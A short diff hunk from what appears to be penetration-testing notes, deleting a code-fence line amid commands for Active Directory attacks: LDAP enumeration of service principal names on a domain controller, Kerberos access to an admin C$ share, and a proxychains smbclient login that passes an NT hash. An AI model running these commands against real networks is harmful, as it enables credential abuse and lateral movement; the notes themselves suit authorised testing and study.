@@ -2884,7 +2884,6 @@ apt install krb5-user
 ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com -D "Administrator@CORP1.COM" -W -b "dc=corp1,dc=com" "servicePrincipalName=*" servicePrincipalName
 
 # smb
-```
 smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$
 proxychains smbclient '\\10.9.0.200\share$' -U 'vault.local/bob%357e1382f274f51526f1e263cef0f67d' --pw-nt-hash
 ```
